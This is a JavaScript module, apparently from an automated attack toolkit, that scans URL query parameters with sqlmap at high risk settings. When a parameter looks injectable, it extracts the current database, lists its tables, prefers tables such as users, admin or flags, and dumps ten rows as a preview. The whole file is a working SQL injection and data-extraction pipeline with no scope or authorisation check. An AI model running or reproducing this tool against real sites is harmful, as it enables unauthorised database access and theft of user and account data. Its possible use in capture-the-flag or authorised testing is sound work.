import { spawn } from 'node:child_process';

const SUSPECT_PARAM_RE = /^(id|uid|user|username|account|cat|category|item|pid|post|page|file|path|q|search|s|ref|order|sort|view|doc|lang|name|email|token)$/i;

function runProc(cmd, args, timeoutMs = 180000) {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const out = [];
    const err = [];
    let killed = false;
    const t = setTimeout(() => {
      killed = true;
      try {
        child.kill('SIGKILL');
      } catch {
        // ignore
      }
      reject(new Error(`${cmd} timeout (${timeoutMs}ms)`));
    }, timeoutMs);
    child.stdout.on('data', (d) => out.push(d));
    child.stderr.on('data', (d) => err.push(d));
    child.on('error', (e) => {
      clearTimeout(t);
      reject(e);
    });
    child.on('close', (code) => {
      clearTimeout(t);
      if (killed) return;
      resolve({
        code,
        stdout: Buffer.concat(out).toString('utf8'),
        stderr: Buffer.concat(err).toString('utf8'),
      });
    });
  });
}

async function hasSqlmap() {
  const finder = process.platform === 'win32' ? 'where' : 'which';
  try {
    const r = await runProc(finder, ['sqlmap'], 5000);
    return r.code === 0;
  } catch {
    return false;
  }
}

function uniqueQueryUrls(urls) {
  const out = [];
  const seen = new Set();
  for (const u of urls || []) {
    try {
      const x = new URL(String(u || ''));
      if (!x.search) continue;
      x.hash = '';
      const k = x.href;
      if (seen.has(k)) continue;
      seen.add(k);
      out.push(x.href);
    } catch {
      // ignore
    }
  }
  return out;
}

function extractDbs(text) {
  const t = String(text || '');
  const dbs = [];
  const re = /\[\*\]\s+([^\r\n]+)/g;
  let m;
  while ((m = re.exec(t)) !== null) {
    const name = String(m[1] || '').trim();
    if (name && !dbs.includes(name)) dbs.push(name);
    if (dbs.length >= 12) break;
  }
  return dbs;
}

function extractCurrentDb(text) {
  const m = String(text || '').match(/current\s+database\s*:\s*'([^']+)'/i);
  return m ? String(m[1] || '').trim() : '';
}

function extractTableNames(text, max = 20) {
  const out = [];
  const t = String(text || '');
  const re = /\|\s*([A-Za-z0-9_.$-]{1,64})\s*\|/g;
  let m;
  while ((m = re.exec(t)) !== null) {
    const name = String(m[1] || '').trim();
    if (!name) continue;
    if (!out.includes(name)) out.push(name);
    if (out.length >= max) break;
  }
  return out;
}

function pickInterestingTable(tables) {
  const list = Array.isArray(tables) ? tables : [];
  const pref = ['users', 'user', 'accounts', 'admin', 'admins', 'members', 'clientes', 'usuarios', 'flags', 'flag'];
  for (const p of pref) {
    const hit = list.find((x) => String(x).toLowerCase() === p || String(x).toLowerCase().includes(p));
    if (hit) return hit;
  }
  return list[0] || '';
}

function buildSqlmapBaseArgs(url, param) {
  return [
    '-u',
    url,
    '-p',
    param,
    '--batch',
    '--level=3',
    '--risk=3',
    '--threads=2',
    '--timeout=10',
    '--retries=1',
  ];
}

export async function runSqlmapProbe({
  urls,
  log,
  maxTargets = 6,
  timeoutPerTargetMs = 150000,
  autoFollowup = true,
  maxFollowups = 2,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const ok = await hasSqlmap();
  if (!ok) return { ok: false, reason: 'sqlmap_missing', attempts: 0, hits: [] };

  let attempts = 0;
  let followups = 0;
  const hits = [];
  const candidates = uniqueQueryUrls(urls);
  for (const u of candidates) {
    if (attempts >= maxTargets) break;
    const x = new URL(u);
    const suspectParams = [...x.searchParams.keys()].filter((k) => SUSPECT_PARAM_RE.test(String(k || '').trim()));
    if (!suspectParams.length) continue;
    for (const p of suspectParams) {
      if (attempts >= maxTargets) break;
      attempts += 1;
      const args = [...buildSqlmapBaseArgs(u, p), '--dbs'];
      logger(`[sqlmap] teste ${p} em ${u}`, 'info');
      try {
        const r = await runProc('sqlmap', args, timeoutPerTargetMs);
        const joined = `${r.stdout || ''}\n${r.stderr || ''}`;
        const low = joined.toLowerCase();
        const injectable =
          low.includes('is vulnerable') ||
          low.includes('parameter') && low.includes('injectable') ||
          low.includes('sql injection');
        const dbs = extractDbs(joined);
        if (injectable || dbs.length) {
          const hit = {
            url: u,
            param: p,
            injectable: Boolean(injectable),
            dbs,
            evidence: dbs.length ? `dbs=${dbs.join(',')}` : 'sqlmap indicou possível injeção',
            currentDb: '',
            tables: [],
            dumpTable: '',
            dumpPreview: '',
          };

          if (autoFollowup && followups < Math.max(0, maxFollowups)) {
            followups += 1;
            try {
              // passo 1: current-db
              const cur = await runProc('sqlmap', [...buildSqlmapBaseArgs(u, p), '--current-db'], timeoutPerTargetMs);
              const curTxt = `${cur.stdout || ''}\n${cur.stderr || ''}`;
              hit.currentDb = extractCurrentDb(curTxt) || dbs[0] || '';

              // passo 2: tables (DB alvo)
              if (hit.currentDb) {
                const tbl = await runProc(
                  'sqlmap',
                  [...buildSqlmapBaseArgs(u, p), '-D', hit.currentDb, '--tables'],
                  timeoutPerTargetMs,
                );
                const tblTxt = `${tbl.stdout || ''}\n${tbl.stderr || ''}`;
                hit.tables = extractTableNames(tblTxt, 20);
              }

              // passo 3: dump seletivo (1 tabela, 10 linhas)
              const tname = pickInterestingTable(hit.tables);
              if (hit.currentDb && tname) {
                const dump = await runProc(
                  'sqlmap',
                  [...buildSqlmapBaseArgs(u, p), '-D', hit.currentDb, '-T', tname, '--dump', '--limit=10'],
                  timeoutPerTargetMs,
                );
                const dumpTxt = `${dump.stdout || ''}\n${dump.stderr || ''}`;
                hit.dumpTable = tname;
                hit.dumpPreview = dumpTxt.slice(0, 500).replace(/\s+/g, ' ').trim();
              }
            } catch (e) {
              logger(`[sqlmap] follow-up ${p} @ ${u}: ${e?.message || String(e)}`, 'warn');
            }
          }
          hits.push(hit);
        }
      } catch (e) {
        logger(`[sqlmap] ${p} @ ${u}: ${e?.message || String(e)}`, 'warn');
      }
    }
  }
  return { ok: true, attempts, hits };
}

